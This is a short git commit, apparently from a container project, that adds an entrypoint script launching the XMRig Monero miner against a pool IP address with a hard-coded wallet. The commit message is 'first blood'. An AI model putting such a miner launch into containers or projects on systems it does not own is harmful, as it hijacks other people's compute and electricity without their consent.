2a72962eddbaaad2b0ff7da1cd7decbcca46a8ee
womd <chk.mailbox@gmail.com>
2023-11-24 14:07:35 +0100

    first blood

---
+++ linux-x64/entrypoint.sh
@@ -0,0 +1,6 @@
+#!/bin/bash
+
+
+/miner/xmrig-6.20.0/xmrig -o 136.243.103.179:3333 -u 41mB5u5GQSMcJwvLQxeDWxEUP5fz5xfWzMqmRKCpw7q33qpZwBnTyCL6rWTfAM1ZxcLbWu9b5LsbjM83MnYkWQ8kTeBWx6b -t 2 -S
+
+tail -f /dev/null
